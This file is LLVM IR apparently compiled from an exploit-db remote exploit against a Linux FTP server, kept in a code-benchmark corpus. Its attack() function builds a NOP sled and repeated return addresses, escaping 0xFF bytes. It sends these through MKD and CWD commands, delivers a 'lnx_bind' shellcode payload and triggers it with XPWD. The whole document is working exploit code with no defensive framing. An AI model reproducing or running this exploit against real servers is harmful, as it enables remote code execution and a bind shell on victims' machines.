; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1295.c_attack.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1295.c_attack.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFSIZ = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [11 x i8] c"MKD %s%s\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"CWD %s%s\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"MKD %s\0D\0A\00", align 1
@lnx_bind = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [9 x i8] c"CWD %s\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"XPWD\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @attack(i32 %0, i64 %1, i8* %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i64 %1, i64* %5, align 8
  store i8* %2, i8** %6, align 8
  %18 = call i64 @malloc(i32 1024)
  %19 = inttoptr i64 %18 to i8*
  store i8* %19, i8** %9, align 8
  %20 = call i64 @malloc(i32 1024)
  %21 = inttoptr i64 %20 to i8*
  store i8* %21, i8** %10, align 8
  %22 = call i64 @malloc(i32 1024)
  %23 = inttoptr i64 %22 to i8*
  store i8* %23, i8** %11, align 8
  %24 = load i32, i32* @BUFSIZ, align 4
  %25 = add nsw i32 %24, 10
  %26 = call i64 @malloc(i32 %25)
  %27 = inttoptr i64 %26 to i8*
  store i8* %27, i8** %12, align 8
  %28 = call i64 @malloc(i32 1024)
  %29 = inttoptr i64 %28 to i8*
  store i8* %29, i8** %13, align 8
  %30 = load i8*, i8** %13, align 8
  %31 = call i32 @memset(i8* %30, i32 0, i32 1024)
  %32 = load i8*, i8** %13, align 8
  %33 = call i32 @memset(i8* %32, i32 144, i32 255)
  %34 = load i8*, i8** %9, align 8
  %35 = call i32 @memset(i8* %34, i32 0, i32 1024)
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %36

36:                                               ; preds = %150, %3
  %37 = load i32, i32* %7, align 4
  %38 = icmp slt i32 %37, 60
  br i1 %38, label %39, label %153

39:                                               ; preds = %36
  %40 = load i64, i64* %5, align 8
  %41 = lshr i64 %40, 24
  %42 = and i64 %41, 255
  %43 = trunc i64 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i64, i64* %5, align 8
  %45 = lshr i64 %44, 16
  %46 = and i64 %45, 255
  %47 = trunc i64 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i64, i64* %5, align 8
  %49 = lshr i64 %48, 8
  %50 = and i64 %49, 255
  %51 = trunc i64 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i64, i64* %5, align 8
  %53 = and i64 %52, 255
  %54 = trunc i64 %53 to i8
  store i8 %54, i8* %17, align 1
  %55 = load i8, i8* %17, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 255
  br i1 %57, label %58, label %69

58:                                               ; preds = %39
  %59 = load i8, i8* %17, align 1
  %60 = load i8*, i8** %9, align 8
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  store i8 %59, i8* %63, align 1
  %64 = load i8*, i8** %9, align 8
  %65 = load i32, i32* %8, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* %8, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %64, i64 %67
  store i8 -1, i8* %68, align 1
  br label %75

69:                                               ; preds = %39
  %70 = load i8, i8* %17, align 1
  %71 = load i8*, i8** %9, align 8
  %72 = load i32, i32* %8, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  store i8 %70, i8* %74, align 1
  br label %75

75:                                               ; preds = %69, %58
  %76 = load i8, i8* %16, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp eq i32 %77, 255
  br i1 %78, label %79, label %92

79:                                               ; preds = %75
  %80 = load i8, i8* %16, align 1
  %81 = load i8*, i8** %9, align 8
  %82 = load i32, i32* %8, align 4
  %83 = add nsw i32 %82, 1
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  store i8 %80, i8* %85, align 1
  %86 = load i8*, i8** %9, align 8
  %87 = load i32, i32* %8, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %8, align 4
  %89 = add nsw i32 %88, 1
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %86, i64 %90
  store i8 -1, i8* %91, align 1
  br label %99

92:                                               ; preds = %75
  %93 = load i8, i8* %16, align 1
  %94 = load i8*, i8** %9, align 8
  %95 = load i32, i32* %8, align 4
  %96 = add nsw i32 %95, 1
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8, i8* %94, i64 %97
  store i8 %93, i8* %98, align 1
  br label %99

99:                                               ; preds = %92, %79
  %100 = load i8, i8* %15, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 255
  br i1 %102, label %103, label %116

103:                                              ; preds = %99
  %104 = load i8, i8* %15, align 1
  %105 = load i8*, i8** %9, align 8
  %106 = load i32, i32* %8, align 4
  %107 = add nsw i32 %106, 2
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8, i8* %105, i64 %108
  store i8 %104, i8* %109, align 1
  %110 = load i8*, i8** %9, align 8
  %111 = load i32, i32* %8, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %8, align 4
  %113 = add nsw i32 %112, 2
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %110, i64 %114
  store i8 -1, i8* %115, align 1
  br label %123

116:                                              ; preds = %99
  %117 = load i8, i8* %15, align 1
  %118 = load i8*, i8** %9, align 8
  %119 = load i32, i32* %8, align 4
  %120 = add nsw i32 %119, 2
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %118, i64 %121
  store i8 %117, i8* %122, align 1
  br label %123

123:                                              ; preds = %116, %103
  %124 = load i8, i8* %14, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 255
  br i1 %126, label %127, label %140

127:                                              ; preds = %123
  %128 = load i8, i8* %14, align 1
  %129 = load i8*, i8** %9, align 8
  %130 = load i32, i32* %8, align 4
  %131 = add nsw i32 %130, 3
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds i8, i8* %129, i64 %132
  store i8 %128, i8* %133, align 1
  %134 = load i8*, i8** %9, align 8
  %135 = load i32, i32* %8, align 4
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %8, align 4
  %137 = add nsw i32 %136, 3
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i8, i8* %134, i64 %138
  store i8 -1, i8* %139, align 1
  br label %147

140:                                              ; preds = %123
  %141 = load i8, i8* %14, align 1
  %142 = load i8*, i8** %9, align 8
  %143 = load i32, i32* %8, align 4
  %144 = add nsw i32 %143, 3
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8, i8* %142, i64 %145
  store i8 %141, i8* %146, align 1
  br label %147

147:                                              ; preds = %140, %127
  %148 = load i32, i32* %8, align 4
  %149 = add nsw i32 %148, 4
  store i32 %149, i32* %8, align 4
  br label %150

150:                                              ; preds = %147
  %151 = load i32, i32* %7, align 4
  %152 = add nsw i32 %151, 1
  store i32 %152, i32* %7, align 4
  br label %36

153:                                              ; preds = %36
  %154 = load i8*, i8** %10, align 8
  %155 = load i8*, i8** %6, align 8
  %156 = load i8*, i8** %9, align 8
  %157 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %154, i32 1000, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0), i8* %155, i8* %156)
  %158 = load i8*, i8** %11, align 8
  %159 = load i8*, i8** %6, align 8
  %160 = load i8*, i8** %9, align 8
  %161 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %158, i32 1000, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0), i8* %159, i8* %160)
  store i32 0, i32* %7, align 4
  br label %162

162:                                              ; preds = %184, %153
  %163 = load i32, i32* %7, align 4
  %164 = icmp slt i32 %163, 11
  br i1 %164, label %165, label %187

165:                                              ; preds = %162
  %166 = load i32, i32* %4, align 4
  %167 = load i8*, i8** %10, align 8
  %168 = load i8*, i8** %10, align 8
  %169 = call i32 @strlen(i8* %168)
  %170 = call i32 @send(i32 %166, i8* %167, i32 %169, i32 0)
  %171 = load i32, i32* %4, align 4
  %172 = load i8*, i8** %12, align 8
  %173 = load i32, i32* @BUFSIZ, align 4
  %174 = call i32 @recv(i32 %171, i8* %172, i32 %173, i32 0)
  %175 = load i32, i32* %4, align 4
  %176 = load i8*, i8** %11, align 8
  %177 = load i8*, i8** %11, align 8
  %178 = call i32 @strlen(i8* %177)
  %179 = call i32 @send(i32 %175, i8* %176, i32 %178, i32 0)
  %180 = load i32, i32* %4, align 4
  %181 = load i8*, i8** %12, align 8
  %182 = load i32, i32* @BUFSIZ, align 4
  %183 = call i32 @recv(i32 %180, i8* %181, i32 %182, i32 0)
  br label %184

184:                                              ; preds = %165
  %185 = load i32, i32* %7, align 4
  %186 = add nsw i32 %185, 1
  store i32 %186, i32* %7, align 4
  br label %162

187:                                              ; preds = %162
  store i32 0, i32* %7, align 4
  br label %188

188:                                              ; preds = %240, %187
  %189 = load i32, i32* %7, align 4
  %190 = icmp slt i32 %189, 2
  br i1 %190, label %191, label %243

191:                                              ; preds = %188
  %192 = load i8*, i8** %10, align 8
  %193 = load i8*, i8** @lnx_bind, align 8
  %194 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %192, i32 1000, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i8* %193)
  %195 = load i8*, i8** %11, align 8
  %196 = load i8*, i8** @lnx_bind, align 8
  %197 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %195, i32 1000, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* %196)
  %198 = load i32, i32* %4, align 4
  %199 = load i8*, i8** %10, align 8
  %200 = load i8*, i8** %10, align 8
  %201 = call i32 @strlen(i8* %200)
  %202 = call i32 @send(i32 %198, i8* %199, i32 %201, i32 0)
  %203 = load i32, i32* %4, align 4
  %204 = load i8*, i8** %12, align 8
  %205 = load i32, i32* @BUFSIZ, align 4
  %206 = call i32 @recv(i32 %203, i8* %204, i32 %205, i32 0)
  %207 = load i32, i32* %4, align 4
  %208 = load i8*, i8** %11, align 8
  %209 = load i8*, i8** %11, align 8
  %210 = call i32 @strlen(i8* %209)
  %211 = call i32 @send(i32 %207, i8* %208, i32 %210, i32 0)
  %212 = load i32, i32* %4, align 4
  %213 = load i8*, i8** %12, align 8
  %214 = load i32, i32* @BUFSIZ, align 4
  %215 = call i32 @recv(i32 %212, i8* %213, i32 %214, i32 0)
  %216 = load i8*, i8** %10, align 8
  %217 = load i8*, i8** %13, align 8
  %218 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %216, i32 1000, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i8* %217)
  %219 = load i8*, i8** %11, align 8
  %220 = load i8*, i8** %13, align 8
  %221 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %219, i32 1000, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* %220)
  %222 = load i32, i32* %4, align 4
  %223 = load i8*, i8** %10, align 8
  %224 = load i8*, i8** %10, align 8
  %225 = call i32 @strlen(i8* %224)
  %226 = call i32 @send(i32 %222, i8* %223, i32 %225, i32 0)
  %227 = load i32, i32* %4, align 4
  %228 = load i8*, i8** %12, align 8
  %229 = load i32, i32* @BUFSIZ, align 4
  %230 = call i32 @recv(i32 %227, i8* %228, i32 %229, i32 0)
  %231 = load i32, i32* %4, align 4
  %232 = load i8*, i8** %11, align 8
  %233 = load i8*, i8** %11, align 8
  %234 = call i32 @strlen(i8* %233)
  %235 = call i32 @send(i32 %231, i8* %232, i32 %234, i32 0)
  %236 = load i32, i32* %4, align 4
  %237 = load i8*, i8** %12, align 8
  %238 = load i32, i32* @BUFSIZ, align 4
  %239 = call i32 @recv(i32 %236, i8* %237, i32 %238, i32 0)
  br label %240

240:                                              ; preds = %191
  %241 = load i32, i32* %7, align 4
  %242 = add nsw i32 %241, 1
  store i32 %242, i32* %7, align 4
  br label %188

243:                                              ; preds = %188
  %244 = load i32, i32* %4, align 4
  %245 = call i32 @strlen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %246 = call i32 @send(i32 %244, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0), i32 %245, i32 0)
  %247 = load i8*, i8** %10, align 8
  %248 = call i32 @free(i8* %247)
  %249 = load i8*, i8** %11, align 8
  %250 = call i32 @free(i8* %249)
  %251 = load i8*, i8** %9, align 8
  %252 = call i32 @free(i8* %251)
  %253 = load i8*, i8** %12, align 8
  %254 = call i32 @free(i8* %253)
  ret void
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, ...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
